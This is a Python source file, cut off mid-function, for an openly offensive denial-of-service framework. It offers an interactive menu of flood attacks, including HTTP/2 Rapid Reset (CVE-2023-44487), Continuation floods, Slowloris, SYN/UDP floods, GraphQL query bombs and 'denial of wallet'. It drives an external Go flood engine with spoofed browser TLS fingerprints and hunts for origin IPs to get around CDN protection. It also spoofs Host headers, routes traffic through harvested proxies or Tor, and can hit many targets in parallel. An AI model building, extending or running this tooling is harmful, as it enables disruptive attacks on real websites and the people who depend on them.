import os
import sys
import json
import yaml
import argparse
import asyncio
import logging
import time
import subprocess
import signal
import random
import psutil
import threading
from datetime import datetime
from typing import Optional, Dict, List, Any
from urllib.parse import urlparse

IS_WINDOWS = sys.platform == "win32"

# Set UTF-8 encoding for Windows console
if IS_WINDOWS:
    import codecs
    sys.stdout = codecs.getwriter('utf-8')(sys.stdout.buffer, 'strict')
    sys.stderr = codecs.getwriter('utf-8')(sys.stderr.buffer, 'strict')

from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.layout import Layout
from rich.text import Text
from rich import box

_RICH_CONSOLE = Console(force_terminal=True, legacy_windows=False)

os.makedirs("logs", exist_ok=True)
_LOG_FILE = f"logs/mpc_layer_{datetime.now():%Y%m%d}.log"
logging.basicConfig(
    level=logging.WARNING,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    handlers=[logging.FileHandler(_LOG_FILE, encoding="utf-8")],
    force=True,
)
for _name in ("enhanced_attack", "attack_engine", "proxy_engine", "target_detector",
              "origin_hunter", "proxy_harvester", "mpc_layer"):
    logging.getLogger(_name).setLevel(logging.ERROR)

logger = logging.getLogger("mpc_layer")

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

VERSION = "6.0"
GO_ENGINE = "bin/go_engine.exe"
RAPID_RESET_BIN = "bin/rapid_reset.exe"

# Global bypass feature flags (loaded from env)
BYPASS_FLAGS = {}

# ---------- Multi-target helpers ----------
def load_target_lines(path: str = "target/target.txt") -> List[str]:
    try:
        with open(path, encoding="utf-8") as f:
            lines = [l.strip() for l in f if l.strip() and not l.strip().startswith("#")]
        return lines
    except FileNotFoundError:
        return []

async def resolve_targets(prompt: str = " Target URL") -> List[str]:
    print()
    print(f"  [1] Single URL")
    print(f"  [2] Multi-target from target/target.txt")
    print(f"  [3] Enter multiple URLs manually")
    mode = get_input(" Target mode [1/2/3] (default 1): ").strip() or "1"
    targets: List[str] = []
    if mode == "2":
        targets = load_target_lines()
        if not targets:
            print(f"  {c('r','[-]')} target/target.txt not found or empty")
            return []
        print(f"  {c('g','[+]')} Loaded {len(targets)} targets:")
        for i, t in enumerate(targets, 1):
            print(f"      {i:2d}. {c('w',t)}")
    elif mode == "3":
        print("  Enter targets (one per line, empty line to finish):")
        while True:
            t = input("    > ").strip()
            if not t:
                break
            if not t.startswith(("http://", "https://")):
                t = "https://" + t
            targets.append(t)
        if targets:
            print(f"  {c('g','[+]')} {len(targets)} targets loaded")
        else:
            return []
    else:
        t = get_input(f" {prompt}: ")
        if not t:
            return []
        if not t.startswith(("http://", "https://")):
            t = "https://" + t
        targets = [t]
    return targets

# ---------- Multi-target dispatch ----------
_multi_active: Dict[str, asyncio.Task] = {}

def _render_multi_dashboard(targets: List[str]):
    """Simple live per-target status table printed each refresh."""
    from rich.table import Table
    t = Table(title=f"Multi-Target Attack ({len(targets)} targets)", box=box.SIMPLE,
              border_style="bright_black", header_style="bold cyan")
    t.add_column("#", style="dim")
    t.add_column("Target", style="bold white", width=40)
    t.add_column("Status", justify="center")
    t.add_column("Sent", justify="right")
    t.add_column("OK", justify="right")
    t.add_column("Fail", justify="right")
    t.add_column("RPS", justify="right")
    for idx, url in enumerate(targets, 1):
        status = "[yellow]running[/]"
        sent = ok = fail = rps = "-"
        task = _multi_active.get(url)
        if not task or task.done():
            if task and task.done() and task.exception():
                status = f"[red]err[/]"
            else:
                status = "[green]done[/]"
        t.add_row(str(idx), url, status, str(sent), str(ok), str(fail), str(rps))
    _RICH_CONSOLE.clear()
    _RICH_CONSOLE.print(t)

async def run_multi_target(module_coro_factory, targets: List[str],
                           module_name: str = "", duration: int = 0):
    """Run an async module function against multiple targets in parallel."""
    global _multi_active
    if not targets:
        return {}
    _multi_active.clear()
    print(f"  {c('c','[*]')} Launching {module_name or 'attack'} against {len(targets)} targets...")
    # Start all
    for url in targets:
        task = asyncio.create_task(module_coro_factory(url))
        _multi_active[url] = task
        await asyncio.sleep(0.02)
    # Wait loop with periodic display
    remain = duration
    while remain > 0:
        alive = sum(1 for t in _multi_active.values() if not t.done())
        if alive == 0:
            break
        _render_multi_dashboard(targets)
        await asyncio.sleep(min(3, remain))
        remain -= 3
    # Gather results
    results = {}
    for url, task in _multi_active.items():
        try:
            r = await task
            results[url] = r if r else {}
        except Exception as e:
            results[url] = {"error": str(e)}
    _multi_active.clear()
    return results

def print_multi_summary(targets: List[str], results: Dict[str, Any], duration: int):
    """Print a combined result table after multi-target attack."""
    from rich.table import Table
    print()
    t = Table(title=f"Multi-Target Results ({len(targets)} targets, {duration}s)",
              box=box.HEAVY_EDGE, border_style="cyan", header_style="bold white")
    t.add_column("Target", style="bold white", width=40)
    t.add_column("Sent", justify="right")
    t.add_column("Completed", justify="right")
    t.add_column("Failed", justify="right")
    t.add_column("RPS", justify="right")
    total_sent = total_ok = total_fail = 0
    for url in targets:
        r = results.get(url, {})
        sent = int(r.get("sent", r.get("total_requests", 0)))
        ok = int(r.get("completed", 0))
        fail = int(r.get("failed", 0))
        rps_val = r.get("actual_rps", r.get("rps", 0))
        if isinstance(rps_val, float):
            rps_str = f"{rps_val:.1f}"
        else:
            rps_str = str(rps_val)
        total_sent += sent
        total_ok += ok
        total_fail += fail
        t.add_row(url, str(sent), str(ok), str(fail), rps_str)
    t.add_row("[bold]TOTAL[/]", str(total_sent), str(total_ok), str(total_fail),
              f"{total_sent/max(duration,1):.1f}" if duration else "-",
              style="bold yellow")
    _RICH_CONSOLE.print(t)

def _rich_sep():
    """Print a Rich separator line."""
    _RICH_CONSOLE.rule(style="dim cyan")

def _rich_header(title: str, subtitle: str = ""):
    """Print a Rich panel header."""
    _RICH_CONSOLE.print()
    content = f"[bold cyan]{title}[/]"
    if subtitle:
        content += f"\n[white]{subtitle}[/]"
    _RICH_CONSOLE.print(Panel(content, border_style="cyan", box=box.HEAVY))

def check_flaresolverr():
    """Auto-detect FlareSolverr service. Returns (available: bool, endpoint: str)."""
    endpoint = os.environ.get("FLARESOLVERR_ENDPOINT", "http://localhost:8191")
    try:
        from urllib.request import Request, urlopen
        req = Request(f"{endpoint}/v1", data=b'{"cmd":"sessions.list"}',
                      headers={"Content-Type": "application/json"}, method="POST")
        with urlopen(req, timeout=3) as resp:
            if resp.status == 200:
                print(f" {c('g','[+]')} FlareSolverr detected: {endpoint}")
                return True, endpoint
    except Exception:
        pass
    # Skip FlareSolverr silently - not required for operation
    print(f" {c('y','[*]')} FlareSolverr not available (optional, skipping)")
    return False, endpoint

def load_bypass_flags(env: dict = None) -> dict:
    """Load bypass feature flags from env."""
    if env is None:
        env = load_env()
    flags = {
        "http2_impersonation": env.get("USE_HTTP2_IMPERSONATION", "1") == "1",
        "waf_parsing_bypass": env.get("USE_WAF_PARSING_BYPASS", "1") == "1",
        "behavioral_evasion": env.get("USE_BEHAVIORAL_EVASION", "1") == "1",
        "flaresolverr": env.get("USE_FLARESOLVERR", "1") == "1",
        "origin_discovery": env.get("USE_ORIGIN_DISCOVERY", "1") == "1",
        "browser_pool": env.get("USE_BROWSER_POOL", "1") == "1",
    }
    return flags

def load_config(path: str = "config/default.yaml") -> dict:
    d = {
        "proxy": {"connect_timeout": 3, "min_pool": 5, "health_check_interval": 60, "max_fail": 3},
        "attack": {"default_duration": 300, "default_method": "http_get_flood", "max_rps": 50000, "min_rps": 100, "initial_rps": 5000},
        "http2": {"enabled": True, "default_profile": "chrome126", "profile_rotation": 50},
        "waf_bypass": {"enabled": True, "auto_probe": True, "probe_methods": 10, "effectiveness_threshold": 0.5},
        "behavioral": {"enabled": True, "browser_mode": "nodriver", "browser_pool": {"max_concurrent": 10, "recycle_after": 1000, "session_ttl": 600}},
        "flaresolverr": {"enabled": True, "endpoint": "http://localhost:8191", "timeout": 30, "auto_start": True},
        "origin_discovery": {"enabled": True, "timeout": 8, "max_concurrent": 200},
        "session_pool": {"enabled": True, "max_sessions": 100, "cookie_db": "cookies/sessions.db"},
    }
    try:
        with open(path) as f:
            loaded = yaml.safe_load(f)
            if loaded:
                _merge(d, loaded)
    except Exception:
        pass
    # Also load settings.yaml if it exists
    try:
        with open("config/settings.yaml") as f:
            loaded = yaml.safe_load(f)
            if loaded:
                _merge(d, loaded)
    except Exception:
        pass
    return d

def load_env(path: str = ".env") -> dict:
    env = {}
    try:
        with open(path) as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#") and "=" in line:
                    key, val = line.split("=", 1)
                    env[key.strip()] = val.strip()
    except Exception:
        pass
    return env

def _merge(b: dict, o: dict):
    for k, v in o.items():
        if k in b and isinstance(b[k], dict) and isinstance(v, dict):
            _merge(b[k], v)
        else:
            b[k] = v

def c(t, s):
    codes = {"g": "32", "r": "31", "y": "33", "c": "36", "w": "37", "m": "35", "d": "90"}
    return f"\033[1;{codes.get(t, '37')}m{s}\033[0m"

def banner():
    # ASCII Art "LAYER 7 ATTACK" - Professional
    ascii_art = """
[bold red]  ▒█████   ▓██   ██▓ ▓█████  ███▄    █      ▓█████  ██▀███   ██▀███   ▒█████   ██▀███  [/]
[bold dark_orange] ▒██▒  ██▒  ▒██  ██▒ ▓█   ▀  ██ ▀█   █      ▓█   ▀ ▓██ ▒ ██▒▓██ ▒ ██▒▒██▒  ██▒▓██ ▒ ██▒[/]
[bold yellow] ▒██░  ██▒   ▒██ ██░ ▒███   ▓██  ▀█ ██▒     ▒███   ▓██ ░▄█ ▒▓██ ░▄█ ▒▒██░  ██▒▓██ ░▄█ ▒[/]
[bold green] ▒██   ██░   ░ ▐██▓░ ▒▓█  ▄ ▓██▒  ▐▌██▒     ▒▓█  ▄ ▒██▀▀█▄  ▒██▀▀█▄  ▒██   ██░▒██▀▀█▄  [/]
[bold cyan] ░ ████▓▒░   ░ ██▒▓░ ░▒████▒▒██░   ▓██░     ░▒████▒░██▓ ▒██▒░██▓ ▒██▒░ ████▓▒░░██▓ ▒██▒[/]
[bold dodger_blue2] ░ ▒░▒░▒░     ██▒▒▒  ░░ ▒░ ░░ ▒░   ▒ ▒      ░░ ▒░ ░░ ▒▓ ░▒▓░░ ▒▓ ░▒▓░░ ▒░▒░▒░ ░ ▒▓ ░▒▓░[/]
[bold magenta]   ░ ▒ ▒░   ▓██ ░▒░   ░ ░  ░░ ░░   ░ ▒░      ░ ░  ░  ░▒ ░ ▒░  ░▒ ░ ▒░  ░ ▒ ▒░   ░▒ ░ ▒░[/]
[bold purple] ░ ░ ░ ▒    ▒ ▒ ░░      ░      ░   ░ ░         ░     ░░   ░   ░░   ░ ░ ░ ░ ▒    ░░   ░[/]
"""
    _RICH_CONSOLE.print(ascii_art)
    
    header = f'[bold white]Multi-Protocol Concurrency Layer[/] | [bold cyan]Advanced Attack Framework[/] [bold yellow]v{VERSION}[/]'
    _RICH_CONSOLE.print(header)
    separator = "[dim white]" + ("─" * 98) + "[/]"
    _RICH_CONSOLE.print(separator)
    _RICH_CONSOLE.print()

def menu():
    banner()
    
    menu_text = """
  [bold magenta]LAYER 7 & 4 VECTORS[/]                                 [bold magenta]ADVANCED EVASION[/]
  [bold yellow][1][/] [bold white]HTTP Flood[/]      [dim white]Layer 7 smart endpoint flood[/]      [bold yellow][A][/] [bold white]Cache-Bypass[/]    [dim white]Hit origin, skip CDN cache[/]
  [bold yellow][2][/] [bold white]HTTP/2 Flood[/]    [dim white]HTTP/2 multiplexing attack[/]        [bold yellow][B][/] [bold white]Smuggling[/]       [dim white]HTTP request smuggling[/]
  [bold yellow][3][/] [bold white]Rapid Reset[/]     [dim white]CVE-2023-44487 stream reset[/]       [bold yellow][C][/] [bold white]HPACK Bomb[/]      [dim white]HTTP/2 header compression[/]
  [bold yellow][4][/] [bold white]Slowloris[/]       [dim white]Slow header exhaustion[/]            [bold yellow][D][/] [bold white]Continuation[/]    [dim white]CVE-2024-27316 H2 flood[/]
  [bold yellow][5][/] [bold white]Proxy Flood[/]     [dim white]Rotating proxy attack[/]             [bold yellow][E][/] [bold white]Settings[/]        [dim white]HTTP/2 settings spam[/]
  [bold yellow][6][/] [bold white]SYN Flood[/]       [dim white]Layer 4 TCP SYN flood[/]             [bold yellow][F][/] [bold white]TLS Reneg[/]       [dim white]TLS renegotiation burn[/]
  [bold yellow][7][/] [bold white]UDP Flood[/]       [dim white]Layer 4 UDP flood[/]                 [bold yellow][G][/] [bold white]POST Bomb[/]       [dim white]50MB multipart upload[/]

  [bold magenta]QUIC & WEBSOCKET[/]                                    [bold magenta]API & LOGIC BOMBS[/]
  [bold yellow][Q][/] [bold white]HTTP/3 Hijack[/]   [dim white]QUIC stream manipulation[/]          [bold yellow][T][/] [bold white]REST API[/]        [dim white]CRUD endpoint flood[/]
  [bold yellow][R][/] [bold white]QUIC CID[/]        [dim white]Connection ID table flood[/]         [bold yellow][U][/] [bold white]GraphQL[/]         [dim white]Deep nested query bomb[/]
  [bold yellow][S][/] [bold white]QUIC Crypto[/]     [dim white]Handshake CPU exhaustion[/]          [bold yellow][V][/] [bold white]GraphQL Alias[/]   [dim white]200-alias query bomb[/]
  [bold yellow][I][/] [bold white]WebSocket[/]       [dim white]WS connection storm[/]               [bold yellow][W][/] [bold white]gRPC[/]            [dim white]HTTP/2 gRPC flood[/]
  [bold yellow][J][/] [bold white]Conn Storm[/]      [dim white]TCP connection hold[/]               [bold yellow][X][/] [bold white]JSON/XML[/]        [dim white]Parsing bomb attack[/]

  [bold magenta]AUTOMATION & UTILITIES[/]                              [bold magenta]SYSTEM & OTHERS[/]
  [bold yellow][8][/] [bold white]Mixed Attack[/]    [dim white]ALL 26 vectors parallel[/]           [bold yellow][Y][/] [bold white]Cold Start[/]      [dim white]Serverless auto-scale[/]
  [bold yellow][9][/] [bold white]Auto Mode V5[/]    [dim white]50+Vectors+L4+OriginV2+MSF+Report[/]   [bold yellow][Z][/] [bold white]Cost Acc[/]        [dim white]Denial of Wallet[/]
  [bold yellow][N][/] [bold white]Advanced 2026[/]   [dim white]Behavioral + Fingerprint[/]          [bold yellow][K][/] [bold white]SEO Attack[/]      [dim white]Negative SEO manipulation[/]
  [bold yellow][H][/] [bold white]Origin Hunt[/]     [dim white]Find IP + Underminr CDN bypass[/]    [bold yellow][L][/] [bold white]Business Logic[/]  [dim white]Low-slow resource drain[/]
  [bold yellow][!][/] [bold white]H2SMUGGLE[/]       [dim white]HTTP/2 desync 2026 method[/]         [bold yellow][M][/] [bold white]Bypass Config[/]   [dim white]Toggle evasion modules[/]
  [bold yellow][P][/] [bold white]Harvest Proxy[/]   [dim white]Auto-scrape 24k+ proxies[/]          [bold yellow][#][/] [bold white]Payload Pad[/]    [dim white]WAF buffer overflow[/]
  [bold yellow][0][/] [bold white]Dashboard[/]       [dim white]Web monitoring panel[/]

[dim white]──────────────────────────────────────────────────────────────────────────────────────────────────[/]"""
    
    _RICH_CONSOLE.print(menu_text)

# =
# TOGGLE BYPASS FEATURES
# =
def toggle_bypass_features():
    """Interactive toggling of bypass feature flags."""
    global BYPASS_FLAGS
    feature_names = {
        "1": ("HTTP/2 Impersonation", "http2_impersonation"),
        "2": ("WAF Parsing Bypass", "waf_parsing_bypass"),
        "3": ("Behavioral Evasion", "behavioral_evasion"),
        "4": ("FlareSolverr", "flaresolverr"),
        "5": ("Origin Discovery", "origin_discovery"),
        "6": ("Browser Pool", "browser_pool"),
    }
    while True:
        table = Table(title="BYPASS MODULE TOGGLES", box=box.HEAVY_EDGE, border_style="cyan",
                      show_header=True, header_style="bold white on grey15")
        table.add_column("Key", justify="center", width=6)
        table.add_column("Module", ratio=2)
        table.add_column("Status", justify="center", width=10)
        for key, (name, flag) in feature_names.items():
            status = "[bold green]ON[/]" if BYPASS_FLAGS.get(flag, True) else "[bold red]OFF[/]"
            table.add_row(f"[cyan]{key}[/]", name, status)
        table.add_row("", "", "")
        table.add_row("[cyan]0[/]", "[bold]Back to Main Menu[/]", "")
        _RICH_CONSOLE.print(table)
        ch = get_input(" [bold]Toggle module [1-6] or 0 to exit:[/] ").strip()
        if ch == "0":
            break
        if ch in feature_names:
            name, flag = feature_names[ch]
            BYPASS_FLAGS[flag] = not BYPASS_FLAGS.get(flag, True)
            status = "[green]ENABLED[/]" if BYPASS_FLAGS[flag] else "[red]DISABLED[/]"
            _RICH_CONSOLE.print(f"  [bold green][+][/] {name}: {status}")
        else:
            _RICH_CONSOLE.print(f"  [bold red][-][/] Invalid option")

def get_input(prompt: str) -> str:
    try:
        return input(prompt).strip()
    except (EOFError, KeyboardInterrupt):
        return ""

def build_go_args(target: str, duration: int, rps: int, method: str, threads: int = 0,
                  proxy_file: str = "", http2: bool = False, rapid_reset: bool = False,
                  origin_ip: str = "", ja3: str = "") -> List[str]:
    args = [
        GO_ENGINE,
        "-target", target,
        "-duration", str(duration),
        "-rps", str(rps),
        "-method", method,
    ]
    if threads > 0:
        args.extend(["-threads", str(threads)])
    if proxy_file:
        args.extend(["-proxy-file", proxy_file])
    if http2:
        args.append("-http2")
    if rapid_reset:
        args.append("-rapid-reset")
    if origin_ip:
        args.extend(["-origin", origin_ip])
    if ja3:
        args.extend(["-ja3", ja3])
    elif method not in ("syn-flood", "udp-flood"):
        ja3 = random.choice(["chrome136", "chrome120", "firefox140", "safari18", "edge136"])
        args.extend(["-ja3", ja3])
    return args

async def run_go_engine(target: str, duration: int, rps: int, method: str = "http-flood",
                        threads: int = 0, proxy_file: str = "", http2: bool = False,
                        rapid_reset: bool = False, origin_ip: str = "",
                        live_stats: dict = None) -> Dict:
    """
    Run Go engine. If live_stats dict is provided, updates it in real-time
    with parsed [STATS] lines from Go output. Returns final result dict.
    """
    if not os.path.exists(GO_ENGINE):
        print(f" {c('r','[-]')} Go engine not found: {GO_ENGINE}")
        if live_stats is not None:
            live_stats["status"] = "error"
        return {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0, "elapsed": 0}

    args = build_go_args(target, duration, rps, method, threads, proxy_file, http2, rapid_reset, origin_ip)

    if live_stats is None:
        # Legacy mode - print starting message
        print(f" {c('c','[*]')} Starting Go engine: {' '.join(args)}")

    start = time.time()

    if live_stats is not None:
        live_stats["status"] = "running"
        live_stats["stats"] = {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}

    import re
    stats_re = re.compile(
        r"\[STATS\].*?ok=(\d+).*?fail=(\d+).*?in_flight=(\d+).*?rps=([\d.]+)"
    )

    try:
        proc = await asyncio.create_subprocess_exec(
            *args,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )

        final_result = {"total_requests": 0, "completed": 0, "failed": 0,
                        "timeout": 0, "elapsed": 0}

        async def read_stream(stream):
            try:
                while True:
                    line = await stream.readline()
                    if not line:
                        break
                    text = line.decode(errors="replace").strip()
                    if not text:
                        continue

                    # Parse [STATS] lines for live updates
                    m = stats_re.search(text)
                    if m and live_stats is not None:
                        ok = int(m.group(1))
                        fail = int(m.group(2))
                        in_flight = int(m.group(3))
                        rps_val = float(m.group(4))
                        live_stats["stats"] = {
                            "total_requests": ok + fail,
                            "completed": ok,
                            "failed": fail,
                            "timeout": 0,
                            "in_flight": in_flight,
                            "current_rps": rps_val,
                        }
                        continue

                    # Parse final JSON result
                    if text.startswith("{") and "completed" in text:
                        try:
                            parsed = json.loads(text)
                            final_result["total_requests"] = parsed.get("total_requests", 0)
                            final_result["completed"] = parsed.get("completed", 0)
                            final_result["failed"] = parsed.get("failed", 0)
                            final_result["timeout"] = parsed.get("timeout", 0)
                            final_result["elapsed"] = parsed.get("elapsed_seconds", 0)
                            final_result["peak_rps"] = parsed.get("peak_rps", 0)
                            if live_stats is not None:
                                live_stats["stats"] = final_result
                        except json.JSONDecodeError as e:
                            logger.debug(f"JSON parse error: {e}")
                            pass
            except asyncio.CancelledError:
                pass
            except Exception as e:
                logger.error(f"Stream read error: {type(e).__name__}: {e}")
                pass

        try:
            await asyncio.wait_for(
                asyncio.gather(
                    read_stream(proc.stdout),
                    read_stream(proc.stderr),
                    return_exceptions=True,
                ),
                timeout=duration + 30,
            )
        except asyncio.TimeoutError:
            logger.warning(f"Go engine timeout after {duration + 30}s")
            try:
                proc.kill()
            except Exception as e:
                logger.debug(f"Kill process error: {e}")
                pass
        except asyncio.CancelledError:
            logger.info("Go engine cancelled by user")
            try:
                proc.kill()
            except Exception:
                pass
            if live_stats is not None:
                live_stats["status"] = "error"
            return {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0, "elapsed": time.time() - start}

        await proc.wait()

        elapsed = time.time() - start
        if final_result["elapsed"] == 0:
            final_result["elapsed"] = elapsed

        if live_stats is not None:
            live_stats["status"] = "done" if final_result["completed"] > 0 else "error"
            live_stats["stats"] = final_result

        return final_result

    except FileNotFoundError:
        error_msg = f"Go engine not found: {GO_ENGINE}"
        logger.error(error_msg)
        print(f" {c('r','[-]')} {error_msg}")
        if live_stats is not None:
            live_stats["status"] = "error"
        return {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0, "elapsed": time.time() - start}
    except Exception as e:
        error_msg = f"Go engine error: {type(e).__name__}: {e}"
        logger.error(error_msg)
        print(f" {c('r','[-]')} {error_msg}")
        if live_stats is not None:
            live_stats["status"] = "error"
        return {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0, "elapsed": time.time() - start}

async def auto_detect_target(target: str, verbose: bool = True):
    """Auto-detect target capabilities and recommend optimal attack method"""
    if not target.startswith(("http://", "https://")):
        target = "https://" + target

    if verbose:
        print(f" {c('c','[*]')} Auto-detecting target capabilities...")

    try:
        from core.recon.detection.detector import TargetDetector, print_profile
        detector = TargetDetector(timeout=10)
        profile = await detector.probe(target)

        if verbose:
            print_profile(profile, color_func=c)

        return profile
    except Exception as e:
        print(f" {c('y','[!]')} Auto-detect failed: {e} - falling back to manual mode")
        return None

async def smart_layer7_attack(target: str, duration: int, rps: int,
                              user_method: str = "auto", proxy_file: str = "",
                              cfg: dict = None):
    """Smart Layer 7 attack with auto-detection and method switching"""
    if not target.startswith(("http://", "https://")):
        target = "https://" + target

    profile = await auto_detect_target(target, verbose=True)

    if profile is None:
        method = user_method if user_method != "auto" else "http-flood"
        print(f" {c('y','[!]')} No detection - using {method}")
        return await run_go_engine(
            target=target, duration=duration, rps=rps,
            method="http-flood", rapid_reset=(method == "rapid-reset")
        )

    # Auto-pick method based on profile
    use_rapid_reset = profile.needs_rapid_reset
    use_http2 = profile.supports_http2
    use_proxy = profile.needs_proxy

    if user_method == "auto":
        chosen_method = profile.recommended_method
        chosen_strategy = profile.recommended_strategy
    else:
        chosen_method = user_method
        chosen_strategy = user_method
        # Force rapid-reset if HTTP/2 detected and user picked http-flood
        if user_method in ("http-flood", "http2-flood") and use_rapid_reset:
            print(f" {c('g','[+]')} HTTP/2 detected - upgrading to RAPID RESET (more effective)")
            chosen_method = "rapid-reset"
            use_rapid_reset = True

    print(f" {c('g','[+]')} Final attack plan: method={c('w',chosen_method)} strategy={c('w',chosen_strategy)}")
    _rich_sep()

    proxy_pool = None
    if use_proxy and proxy_file:
        from core.network.proxy import ProxyPool
        proxy_pool = ProxyPool(connect_timeout=5, min_pool=5)
        total = await proxy_pool.load_file(proxy_file)
        if total > 0:
            proxy_pool._validator.set_target(target)
            alive = await proxy_pool.quick_validate(total, concurrency=40)
            print(f" {c('g','[+]')} Proxy pool: {alive}/{total} alive")

    if chosen_method == "rapid-reset" or use_rapid_reset:
        result = await run_go_engine(
            target=target, duration=duration, rps=rps,
            method="http-flood", rapid_reset=True
        )
    elif chosen_method in ("http2-flood",) or use_http2:
        result = await run_go_engine(
            target=target, duration=duration, rps=rps,
            method="http-flood", http2=True
        )
    elif chosen_method == "proxy-flood":
        from core.attack.engines.enhanced import run_enhanced_attack
        result = await run_enhanced_attack(
            url=target, duration=duration, method="http_get_flood",
            rps=rps, proxy_pool=proxy_pool
        )
    else:
        result = await run_go_engine(
            target=target, duration=duration, rps=rps,
            method="http-flood"
        )

    return result

async def prompt_target_type(target: str) -> dict:
    """
    Ask user about target type so we know how to handle it.
    Returns: {target_url, origin_ip, target_type, host_header}
    """
    from core.recon.origin.origin_store import is_ip_address

    if not target.startswith(("http://", "https://")):
        # raw input - might be IP, domain, or URL fragment
        if is_ip_address(target.split("/")[0].split(":")[0]):
            target = "https://" + target
        else:
            target = "https://" + target

    parsed = urlparse(target)
    host = (parsed.hostname or "").split(":")[0]

    info = {
        "target_url": target,
        "origin_ip": "",
        "target_type": "url",
        "host_header": parsed.hostname,
    }

    if is_ip_address(host):
        # Target is bare IP
        print(f" {c('y','[*]')} Target appears to be bare IP: {c('w', host)}")
        print(f"   {c('c','1.')} This IS the origin server (use directly, no Host spoofing)")
        print(f"   {c('c','2.')} This is origin IP, but pretend to be a different domain (Host spoofing)")
        choice = get_input(" Choose [1/2] (default 1): ").strip() or "1"

        if choice == "2":
            domain = get_input(" Domain to spoof in Host header (e.g. target.com): ").strip()
            if domain:
                info["target_type"] = "ip_with_host_spoof"
                info["origin_ip"] = host
                info["host_header"] = domain
                info["target_url"] = f"{parsed.scheme}://{domain}{parsed.path or ''}"
                print(f" {c('g','[+]')} Will hit {host}, pretend Host: {domain}")
        else:
            info["target_type"] = "bare_ip"
            info["origin_ip"] = ""
            print(f" {c('g','[+]')} Direct mode - hitting {host}")
    else:
        # Domain/URL - ask if user wants to use known origin
        print(f" {c('c','[*]')} Target type: domain/URL ({host})")

    return info


async def prompt_attack_options(target: str, ask_proxy: bool = True, ask_origin: bool = True):
    """
    Common interactive prompt for attack options.
    Returns dict with: origin_ip, proxy_pool, proxy_file, target_url, host_header
    """
    options = {"origin_ip": "", "proxy_pool": None, "proxy_file": "",
               "target_url": target, "host_header": ""}

    # First: figure out target type
    target_info = await prompt_target_type(target)
    options.update(target_info)
    target = options["target_url"]

    # Origin handling - only for non-IP targets
    if ask_origin and options["target_type"] == "url":
        try:
            from core.recon.origin.origin_store import load_hunt, get_best_origin
            saved = load_hunt(target)
            if saved and (saved.get("verified_origins") or saved.get("candidates")):
                best = get_best_origin(target)
                if best:
                    print(f" {c('g','[+]')} Found saved origin: {c('w', best)}")
                    if get_input(f"   Use saved origin for bypass? (Y/n): ").lower() != "n":
                        options["origin_ip"] = best
            if not options["origin_ip"]:
                if get_input(" Auto-find origin IP for bypass? (y/N): ").lower() == "y":
                    from core.recon.origin.origin_hunter import OriginHunter
                    env = load_env()

                    # PRE-CHECK: Is target actually behind a CDN?
                    # If not, just use DNS resolution as origin (saves 45s timeout).
                    parsed = urlparse(target)
                    hostname = parsed.hostname or ""
                    cdn_detected = False
                    direct_ip = None
                    try:
                        import socket as _socket
                        loop = asyncio.get_event_loop()
                        direct_ip = await loop.run_in_executor(None, _socket.gethostbyname, hostname)
                    except Exception:
                        pass
                    try:
                        import requests as _req
                        probe = await loop.run_in_executor(
                            None,
                            lambda: _req.head(target, timeout=5, allow_redirects=False,
                                              headers={"User-Agent": "Mozilla/5.0"})
                        )
                        srv = (probe.headers.get("Server") or "").lower()
                        cdn_markers = ("cloudflare", "akamai", "fastly", "cloudfront",
                                       "imperva", "incapsula", "sucuri")
                        cdn_detected = (
                            "cf-ray" in {k.lower() for k in probe.headers.keys()}
                            or any(m in srv for m in cdn_markers)
                        )
                    except Exception:
                        pass

                    if not cdn_detected and direct_ip:
                        options["origin_ip"] = direct_ip
                        print(f" {c('g','[+]')} No CDN detected — using DNS origin: {c('w', direct_ip)}")
                    else:
                        if cdn_detected:
                            print(f" {c('c','[*]')} CDN detected — hunting real origin IP...")
                        else:
                            print(f" {c('c','[*]')} Hunting origin IP...")
                        hunter = OriginHunter(timeout=8)
                        try:
                            report = await asyncio.wait_for(hunter.hunt(target, env=env), timeout=45)
                            if report.verified_origins:
                                options["origin_ip"] = report.verified_origins[0]
                                print(f" {c('g','[+]')} Origin found: {options['origin_ip']}")
                            elif report.candidates:
                                options["origin_ip"] = report.candidates[0].ip
                                print(f" {c('y','[*]')} Best candidate: {options['origin_ip']}")
                            elif direct_ip:
                                options["origin_ip"] = direct_ip
                                print(f" {c('y','[*]')} Falling back to DNS origin: {direct_ip}")
                            else:
                                print(f" {c('y','[!]')} No origin found - hitting target directly")
                        except asyncio.TimeoutError:
                            if direct_ip:
                                options["origin_ip"] = direct_ip
                                print(f" {c('y','[!]')} Origin hunt timed out - using DNS origin: {direct_ip}")
                            else:
                                print(f" {c('y','[!]')} Origin hunt timed out - hitting target directly")
        except Exception as e:
            logger.debug(f"Origin handling failed: {e}")

    # Proxy handling - for ATTACK traffic only
    if ask_proxy:
        # Discover proxy files first - smart default
        proxy_files = []
        if os.path.isdir("proxies"):
            proxy_files = sorted([
                f"proxies/{f}" for f in os.listdir("proxies")
                if f.endswith(".txt") and not f.startswith(".")
            ])

        smart_default = "1" if proxy_files else "4"

        print(f"\n {c('c','[*]')} Proxy for ATTACK traffic (not for recon):")
        print(f"   {c('c','1.')} Use existing proxy file(s)" + (f" {c('g','['+str(len(proxy_files))+' files found]')}" if proxy_files else ""))
        print(f"   {c('c','2.')} Auto-harvest fresh proxies first")
        print(f"   {c('c','3.')} Use Tor network (SOCKS5, auto-install)")
        print(f"   {c('c','4.')} No proxies (direct attack)")
        proxy_choice = get_input(f" Choose [1/2/3/4] (default {smart_default}): ").strip() or smart_default

        if proxy_choice == "1":
            if proxy_files:
                print(f"\n {c('c','[*]')} Available proxy files in proxies/:")
                for i, pf in enumerate(proxy_files, 1):
                    try:
                        line_count = sum(1 for line in open(pf) if line.strip() and not line.startswith("#"))
                        print(f"   {c('c', '['+str(i)+']')} {pf} ({line_count} entries)")
                    except Exception:
                        print(f"   {c('c', '['+str(i)+']')} {pf}")
                print(f"   {c('c','[A]')} Use ALL files merged")
                print(f"   {c('c','[M]')} Manual file path")

                sel = get_input(" Choose [number/A/M] (default A): ").strip().upper() or "A"

                files_to_load = []
                if sel == "A":
                    files_to_load = proxy_files
